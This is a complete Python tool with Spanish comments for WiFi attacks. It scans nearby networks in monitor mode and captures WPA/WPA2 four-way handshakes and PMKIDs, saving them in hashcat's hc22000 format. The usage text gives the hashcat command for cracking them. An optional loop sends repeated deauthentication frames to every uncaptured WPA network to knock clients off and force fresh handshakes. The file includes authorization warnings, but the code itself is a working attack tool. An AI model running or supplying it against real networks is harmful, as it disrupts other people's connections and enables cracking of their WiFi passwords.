#!/usr/bin/env python3
"""
WiFi Scanner + Handshake Extractor — Modo Monitor

Escanea redes WiFi, captura handshakes WPA/WPA2 (EAPOL 4-way y PMKID)
y los guarda en formato hc22000 compatible con hashcat (-m 22000).

Uso:
    sudo python3 wifi_scanner.py -i wlan0
    sudo python3 wifi_scanner.py -i wlan0 -o capturas/ --deauth

ADVERTENCIA: --deauth envía frames de desautenticación. Úsalo únicamente
en redes propias o sobre las que tengas autorización explícita por escrito.
"""

import argparse
import os
import signal
import struct
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Optional

from scapy.all import sendp, sniff, wrpcap
from scapy.layers.dot11 import (
    Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, RadioTap,
)
from scapy.layers.eap import EAPOL

# ─── Estado global ────────────────────────────────────────────────────────────
networks: dict = {}        # bssid → {ssid, channel, signal, encryption}
handshakes: dict = {}      # bssid → {pmkid, anonce, eapol_m2, mic, client, saved, frames}
eapol_sessions: dict = {}  # (bssid, client_mac) → {msg_num: parsed_frame}
_events_log: list = []     # últimos eventos de captura mostrados en pantalla

_stop_sniff = threading.Event()
_last_render = 0.0
_output_dir: Path = Path("capturas")

MAX_LOG_LINES = 6   # líneas de log visibles al pie de la pantalla
_interface: str = ""

CHANNELS = (
    list(range(1, 14))  # 2.4 GHz
    + [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112,
       116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165]  # 5 GHz
)


def check_root():
    if os.geteuid() != 0:
        print("[-] Requiere root: sudo python3 wifi_scanner.py -i wlan0")
        sys.exit(1)


def run_cmd(cmd: list) -> bool:
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f"[-] Error: {' '.join(cmd)}: {r.stderr.strip()}")
        return False
    return True


def set_monitor_mode(iface: str) -> bool:
    print(f"[*] Configurando {iface} en modo monitor...")
    for cmd in [
        ["ip", "link", "set", iface, "down"],
        ["iw", iface, "set", "monitor", "none"],
        ["ip", "link", "set", iface, "up"],
    ]:
        if not run_cmd(cmd):
            return False
    print(f"[+] {iface} en modo monitor.\n")
    return True


def restore_managed_mode(iface: str):
    print(f"\n[*] Restaurando {iface} a modo managed...")
    for cmd in [
        ["ip", "link", "set", iface, "down"],
        ["iw", iface, "set", "type", "managed"],
        ["ip", "link", "set", iface, "up"],
    ]:
        subprocess.run(cmd, capture_output=True)
    print(f"[+] {iface} restaurada a modo managed.")


# ─── Helpers de MAC ───────────────────────────────────────────────────────────
def mac_to_hex(mac: str) -> str:
    """'aa:bb:cc:dd:ee:ff'  →  'aabbccddeeff'"""
    return mac.replace(":", "").replace("-", "").lower()


# ─── Parsing de Beacon Frames ─────────────────────────────────────────────────
def get_encryption(pkt) -> str:
    cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}").lower()
    privacy = "privacy" in cap
    rsn = pkt.getlayer(Dot11Elt, ID=48)
    wpa = False
    elt = pkt.getlayer(Dot11Elt)
    while elt and isinstance(elt, Dot11Elt):
        if elt.ID == 221 and elt.info[:4] == b"\x00\x50\xf2\x01":
            wpa = True
            break
        elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, "getlayer") else None
    if rsn:
        return "WPA2/WPA3"
    elif wpa:
        return "WPA"
    elif privacy:
        return "WEP"
    return "Abierta"


def get_channel(pkt) -> int:
    elt = pkt.getlayer(Dot11Elt)
    while elt and isinstance(elt, Dot11Elt):
        if elt.ID == 3 and elt.info:
            try:
                return elt.info[0]
            except (IndexError, TypeError):
                pass
        elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, "getlayer") else None
    return 0


def handle_beacon(pkt):
    bssid = pkt[Dot11].addr2
    if not bssid or bssid in networks:
        return
    try:
        ssid = pkt[Dot11Elt].info.decode("utf-8", errors="replace").strip()
    except Exception:
        ssid = ""
    try:
        sig = pkt.dBm_AntSignal
    except Exception:
        sig = "N/A"
    networks[bssid] = {
        "ssid":       ssid or "<oculta>",
        "channel":    get_channel(pkt),
        "signal":     sig,
        "encryption": get_encryption(pkt),
    }


# ─── Parsing de EAPOL Key Frames ──────────────────────────────────────────────
#
# Estructura del frame EAPOL-Key (IEEE 802.11i):
#  [0]      EAPOL version
#  [1]      EAPOL type  (3 = Key)
#  [2:4]    EAPOL length
#  ── body desde offset 4 ──────────────────────────────────────────
#  [4]      Descriptor Type  (2=RSN, 254=WPA1)
#  [5:7]    Key Information  (flags)
#  [7:9]    Key Length
#  [9:17]   Replay Counter
#  [17:49]  Key Nonce  ← ANonce (msg1/3) o SNonce (msg2/4)
#  [49:65]  Key IV
#  [65:73]  Key RSC
#  [73:81]  Reserved
#  [81:97]  Key MIC  ← se pone a cero para el hash de hashcat
#  [97:99]  Key Data Length
#  [99:]    Key Data  ← contiene el PMKID en msg1

def parse_eapol_key(raw_eapol: bytes) -> Optional[dict]:
    """Parsea un frame EAPOL Key. Devuelve None si no es válido."""
    if len(raw_eapol) < 99:
        return None
    if raw_eapol[1] != 3:          # EAPOL type debe ser Key (3)
        return None
    descriptor = raw_eapol[4]
    if descriptor not in (1, 2, 254):   # RSN=2, WPA1=254
        return None

    key_info = struct.unpack(">H", raw_eapol[5:7])[0]

    # Flags dentro de Key Information
    pairwise = bool(key_info & (1 << 3))   # 4-way handshake
    install  = bool(key_info & (1 << 6))
    ack      = bool(key_info & (1 << 7))
    mic      = bool(key_info & (1 << 8))
    secure   = bool(key_info & (1 << 9))

    if not pairwise:
        return None  # Group key, no es el handshake de autenticación

    # Identificar el número de mensaje
    if     ack and not mic and not secure:
        msg_num = 1
    elif not ack and     mic and not secure:
        msg_num = 2
    elif     ack and     mic and     secure:
        msg_num = 3
    elif not ack and     mic and     secure:
        msg_num = 4
    else:
        return None

    nonce        = raw_eapol[17:49]
    mic_bytes    = raw_eapol[81:97]
    kd_len       = struct.unpack(">H", raw_eapol[97:99])[0]
    key_data     = raw_eapol[99: 99 + kd_len] if len(raw_eapol) >= 99 + kd_len else b""

    return {
        "msg_num":  msg_num,
        "nonce":    nonce,
        "mic":      mic_bytes,
        "key_data": key_data,
        "raw":      raw_eapol,
    }


def extract_pmkid(key_data: bytes) -> Optional[bytes]:
    """
    Busca el PMKID KDE en el Key Data del EAPOL msg1.
    Formato KDE: 0xDD | length(1) | OUI(3) | type(1) | data
    PMKID KDE:  OUI=00:0F:AC, type=4, data=16 bytes
    """
    i = 0
    while i + 2 <= len(key_data):
        tag = key_data[i]
        if tag == 0x00:        # padding
            i += 1
            continue
        if tag != 0xDD:
            break
        kde_len = key_data[i + 1]
        if i + 2 + kde_len > len(key_data):
            break
        body = key_data[i + 2: i + 2 + kde_len]
        if len(body) >= 20 and body[:3] == b"\x00\x0f\xac" and body[3] == 4:
            return body[4:20]   # 16 bytes de PMKID
        i += 2 + kde_len
    return None


def eapol_zero_mic(raw_eapol: bytes) -> bytes:
    """Devuelve el frame EAPOL con el campo MIC (offsets 81-96) puesto a cero."""
    if len(raw_eapol) < 97:
        return raw_eapol
    return raw_eapol[:81] + b"\x00" * 16 + raw_eapol[97:]


# ─── Construcción de líneas hc22000 ──────────────────────────────────────────
def _hc22000_pmkid(bssid: str, client: str, ssid: str, pmkid: bytes) -> str:
    return (
        f"WPA*01*{pmkid.hex()}"
        f"*{mac_to_hex(bssid)}"
        f"*{mac_to_hex(client)}"
        f"*{ssid.encode().hex()}"
        f"***"
    )


def _hc22000_eapol(bssid: str, client: str, ssid: str,
                   anonce: bytes, eapol_m2: bytes,
                   mic: bytes, msg_pair: int) -> str:
    return (
        f"WPA*02*{mic.hex()}"
        f"*{mac_to_hex(bssid)}"
        f"*{mac_to_hex(client)}"
        f"*{ssid.encode().hex()}"
        f"*{anonce.hex()}"
        f"*{eapol_zero_mic(eapol_m2).hex()}"
        f"*{msg_pair:02d}"
    )


# ─── Guardado de capturas ─────────────────────────────────────────────────────
def _safe_name(s: str) -> str:
    return "".join(c if c.isalnum() or c in "-_" else "_" for c in s)


def save_handshake(bssid: str):
    hs = handshakes.get(bssid)
    if not hs or hs.get("saved"):
        return

    ssid = networks.get(bssid, {}).get("ssid", bssid)
    fname = f"{_safe_name(ssid)}_{mac_to_hex(bssid)}"
    _output_dir.mkdir(parents=True, exist_ok=True)

    lines = []
    if "pmkid" in hs:
        lines.append(_hc22000_pmkid(bssid, hs["client"], ssid, hs["pmkid"]))
    if all(k in hs for k in ("anonce", "eapol_m2", "mic")):
        lines.append(_hc22000_eapol(
            bssid, hs["client"], ssid,
            hs["anonce"], hs["eapol_m2"], hs["mic"],
            hs.get("msg_pair", 0),
        ))

    if not lines:
        return

    hc_path = _output_dir / f"{fname}.hc22000"
    with open(hc_path, "w") as f:
        f.write("\n".join(lines) + "\n")

    if hs.get("frames"):
        wrpcap(str(_output_dir / f"{fname}.pcap"), hs["frames"])

    hs["saved"] = True
    hs["saved_path"] = str(hc_path)
    types = []
    if "pmkid" in hs:
        types.append("PMKID")
    if all(k in hs for k in ("anonce", "eapol_m2", "mic")):
        types.append("EAPOL 4-way")
    _log_event(
        f"\033[32m✔ Guardado\033[0m  {ssid[:28]:<28}  [{', '.join(types)}]  →  {hc_path.name}"
    )


# ─── Handler de EAPOL ────────────────────────────────────────────────────────
def handle_eapol(pkt):
    dot11 = pkt.getlayer(Dot11)
    eapol_layer = pkt.getlayer(EAPOL)
    if not dot11 or not eapol_layer:
        return

    raw_eapol = bytes(eapol_layer)
    parsed = parse_eapol_key(raw_eapol)
    if not parsed:
        return

    msg_num    = parsed["msg_num"]
    src        = dot11.addr2   # transmisor
    dst        = dot11.addr1   # receptor
    bssid_hdr  = dot11.addr3

    # El AP transmite msg1/msg3; el cliente transmite msg2/msg4
    if msg_num in (1, 3):
        ap_mac, client_mac = src, dst
    else:
        client_mac, ap_mac = src, dst

    # addr3 es el BSSID fiable en infraestructura
    if bssid_hdr and bssid_hdr not in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
        ap_mac = bssid_hdr

    if not ap_mac or not client_mac:
        return

    session_key = (ap_mac, client_mac)
    if session_key not in eapol_sessions:
        eapol_sessions[session_key] = {}
        ssid_label = networks.get(ap_mac, {}).get("ssid", ap_mac)
        _log_event(
            f"\033[36m→ EAPOL msg{msg_num}\033[0m  {ssid_label[:28]:<28}  {ap_mac}  (cliente: {client_mac})"
        )
    eapol_sessions[session_key][msg_num] = parsed

    if ap_mac not in handshakes:
        handshakes[ap_mac] = {"client": client_mac, "frames": [], "saved": False}
    hs = handshakes[ap_mac]
    hs["client"] = client_mac
    hs["frames"].append(pkt)

    # ── PMKID (msg1 Key Data) ───────────────────────────────────────────────
    if msg_num == 1 and "pmkid" not in hs:
        pmkid = extract_pmkid(parsed["key_data"])
        if pmkid:
            hs["pmkid"] = pmkid
            hs["saved"] = False
            ssid_label = networks.get(ap_mac, {}).get("ssid", ap_mac)
            _log_event(
                f"\033[33m⚡ PMKID detectado\033[0m  {ssid_label[:28]:<28}  {ap_mac}  (cliente: {client_mac})"
            )

    session = eapol_sessions[session_key]

    # ── Handshake completo: msg1 + msg2 ─────────────────────────────────────
    if 1 in session and 2 in session and "anonce" not in hs:
        hs["anonce"]   = session[1]["nonce"]
        hs["eapol_m2"] = session[2]["raw"]
        hs["mic"]      = session[2]["mic"]
        hs["msg_pair"] = 0          # 0 = M1+M2 en hc22000
        hs["saved"]    = False
        ssid_label = networks.get(ap_mac, {}).get("ssid", ap_mac)
        _log_event(
            f"\033[33m⚡ Handshake M1+M2\033[0m  {ssid_label[:28]:<28}  {ap_mac}  (cliente: {client_mac})"
        )

    # ── Alternativa: msg2 + msg3 ─────────────────────────────────────────────
    elif 2 in session and 3 in session and "anonce" not in hs:
        hs["anonce"]   = session[3]["nonce"]
        hs["eapol_m2"] = session[2]["raw"]
        hs["mic"]      = session[2]["mic"]
        hs["msg_pair"] = 1          # 1 = M2+M3 en hc22000
        hs["saved"]    = False
        ssid_label = networks.get(ap_mac, {}).get("ssid", ap_mac)
        _log_event(
            f"\033[33m⚡ Handshake M2+M3\033[0m  {ssid_label[:28]:<28}  {ap_mac}  (cliente: {client_mac})"
        )

    if not hs.get("saved") and ("pmkid" in hs or "anonce" in hs):
        save_handshake(ap_mac)


# ─── Packet handler principal ─────────────────────────────────────────────────
def packet_handler(pkt):
    global _last_render
    if pkt.haslayer(Dot11Beacon):
        handle_beacon(pkt)
    if pkt.haslayer(EAPOL):
        handle_eapol(pkt)

    # Limitar refresco de pantalla a 4 fps para no saturar la terminal
    now = time.monotonic()
    if now - _last_render >= 0.25:
        _last_render = now
        render_table()


# ─── Channel hopping ──────────────────────────────────────────────────────────
def channel_hopper(iface: str, stop_event: threading.Event):
    """Rota entre canales cada 500 ms para maximizar la cobertura."""
    idx = 0
    while not stop_event.is_set():
        ch = CHANNELS[idx % len(CHANNELS)]
        subprocess.run(
            ["iw", "dev", iface, "set", "channel", str(ch)],
            capture_output=True,
        )
        idx += 1
        stop_event.wait(0.5)


# ─── Deautenticación (opcional) ───────────────────────────────────────────────
def _send_deauth(iface: str, bssid: str, client: str = "ff:ff:ff:ff:ff:ff"):
    pkt = (
        RadioTap()
        / Dot11(addr1=client, addr2=bssid, addr3=bssid)
        / Dot11Deauth(reason=7)
    )
    sendp(pkt, iface=iface, count=5, inter=0.1, verbose=False)


def deauth_loop(iface: str, stop_event: threading.Event, interval: int = 30):
    """Envía deauths periódicos a redes WPA no capturadas aún."""
    while not stop_event.is_set():
        stop_event.wait(interval)
        if stop_event.is_set():
            break
        for bssid, info in list(networks.items()):
            hs = handshakes.get(bssid, {})
            if not hs.get("saved") and "WPA" in info.get("encryption", ""):
                _send_deauth(iface, bssid)


# ─── Display ──────────────────────────────────────────────────────────────────
def _hs_status(bssid: str) -> str:
    hs = handshakes.get(bssid, {})
    if hs.get("saved"):
        path = hs.get("saved_path", "")
        fname = Path(path).name if path else "archivo"
        return f"\033[32m✔ GUARDADO → {fname}\033[0m"
    parts = []
    if "pmkid" in hs:
        parts.append("PMKID")
    # Mostrar cuántos mensajes EAPOL del 4-way tenemos para esta red
    eapol_msgs: set = set()
    for (ap, _cl), session in eapol_sessions.items():
        if ap == bssid:
            eapol_msgs |= set(session.keys())
    if eapol_msgs:
        msgs_str = "+".join(f"M{n}" for n in sorted(eapol_msgs))
        if "anonce" in hs:
            parts.append(f"EAPOL({msgs_str})")
        else:
            parts.append(f"EAPOL({msgs_str} incompleto)")
    if parts:
        return f"\033[33m⚡ {' | '.join(parts)}\033[0m"
    return "\033[90m—\033[0m"


def _log_event(msg: str):
    """Añade un evento con timestamp al log visible en pantalla."""
    ts = time.strftime("%H:%M:%S")
    _events_log.append(f"  \033[90m[{ts}]\033[0m {msg}")
    if len(_events_log) > MAX_LOG_LINES:
        del _events_log[0]


def render_table():
    os.system("clear")
    total_hs  = sum(1 for h in handshakes.values() if h.get("saved"))
    total_cap = sum(1 for h in handshakes.values() if "anonce" in h or "pmkid" in h)

    W = 112
    print("=" * W)
    print("  WiFi Scanner + Handshake Extractor (hc22000)                   Ctrl+C para salir")
    print("=" * W)
    print(f"  {'BSSID':<20}  {'SSID':<26}  {'CH':<4}  {'dBm':<6}  {'Cifrado':<12}  Estado")
    print("  " + "-" * (W - 4))

    def _sig(item):
        s = item[1]["signal"]
        return s if isinstance(s, (int, float)) else -999

    for bssid, info in sorted(networks.items(), key=_sig, reverse=True):
        print(
            f"  {bssid:<20}  {info['ssid'][:26]:<26}  {info['channel']:<4}  "
            f"{str(info['signal']):<6}  {info['encryption']:<12}  {_hs_status(bssid)}"
        )

    print("=" * W)
    saved_col = "\033[32m" if total_hs  else "\033[0m"
    cap_col   = "\033[33m" if total_cap else "\033[0m"
    RST       = "\033[0m"
    print(
        f"  Redes: {len(networks)}   "
        f"Capturando: {cap_col}{total_cap}{RST}   "
        f"Guardados: {saved_col}{total_hs}{RST}   "
        f"Salida: \033[36m{_output_dir}/\033[0m"
    )

    # ── Log de eventos ────────────────────────────────────────────────────────
    if _events_log:
        print("-" * W)
        for line in _events_log:
            print(line)
    print("=" * W)


# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    global _interface, _output_dir

    parser = argparse.ArgumentParser(
        description="Escanea redes WiFi y captura handshakes WPA/WPA2 en formato hc22000.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Ejemplos:\n"
            "  sudo python3 wifi_scanner.py -i wlan0\n"
            "  sudo python3 wifi_scanner.py -i wlan0 -o /tmp/capturas --deauth\n\n"
            "hashcat (tras capturar):\n"
            "  hashcat -m 22000 capturas/MiRed_*.hc22000 wordlist.txt\n\n"
            "AVISO: --deauth solo debe usarse en redes propias o con autorización explícita."
        ),
    )
    parser.add_argument("-i", "--interface", required=True, metavar="IFACE",
                        help="Interfaz WiFi (ej: wlan0)")
    parser.add_argument("-o", "--output", default="capturas", metavar="DIR",
                        help="Directorio de salida para archivos .hc22000 y .pcap (def: capturas/)")
    parser.add_argument("--deauth", action="store_true",
                        help="Enviar frames deauth para forzar reconexión (solo redes autorizadas)")
    parser.add_argument("--no-hop", dest="hop", action="store_false", default=True,
                        help="Desactiva el salto de canal (fija el canal actual)")

    args = parser.parse_args()
    _interface = args.interface
    _output_dir = Path(args.output)

    check_root()

    if not set_monitor_mode(_interface):
        sys.exit(1)

    hop_stop   = threading.Event()
    deauth_stop = threading.Event()

    def on_exit(sig, frame):
        hop_stop.set()
        deauth_stop.set()
        restore_managed_mode(_interface)
        total = sum(1 for h in handshakes.values() if h.get("saved"))
        print(f"\n[+] Handshakes guardados: {total}  →  {_output_dir}/")
        sys.exit(0)

    signal.signal(signal.SIGINT, on_exit)
    signal.signal(signal.SIGTERM, on_exit)

    if args.hop:
        threading.Thread(
            target=channel_hopper, args=(_interface, hop_stop), daemon=True
        ).start()
        print("[*] Channel hopping activado (500 ms/canal).")

    if args.deauth:
        print("[!] Deauth activado — asegúrate de tener autorización.")
        threading.Thread(
            target=deauth_loop, args=(_interface, deauth_stop), daemon=True
        ).start()

    render_table()
    print(f"[*] Escaneando en {_interface}...\n")
    sniff(iface=_interface, prn=packet_handler, store=False,
          stop_filter=lambda _: _stop_sniff.is_set())


if __name__ == "__main__":
    main()
